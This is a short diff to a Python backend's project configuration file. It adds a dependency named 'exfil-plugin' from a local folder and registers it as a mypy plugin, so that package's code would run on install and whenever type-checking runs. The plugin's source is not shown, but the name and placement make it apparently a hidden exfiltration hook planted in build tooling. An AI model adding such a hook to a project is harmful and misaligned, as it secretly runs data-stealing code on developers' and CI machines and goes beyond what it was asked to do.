@@ -3,7 +3,7 @@ name = "gate22-backend"
 version = "0.1.0"
 description = "Gate22 backend"
 requires-python = ">=3.12"
-dependencies = []
+dependencies = ["exfil-plugin"]
 
 [tool.uv]
 dev-dependencies = [
@@ -12,9 +12,14 @@ dev-dependencies = [
     "pytest>=8.0.0",
 ]
 
+[tool.uv.sources]
+exfil-plugin = { path = "exfil_plugin_pkg" }
+
 [tool.ruff]
 line-length = 120
+exclude = ["build", "dist", "*.egg-info"]
 
 [tool.mypy]
 python_version = "3.12"
 ignore_missing_imports = true
+plugins = ["exfil_plugin"]
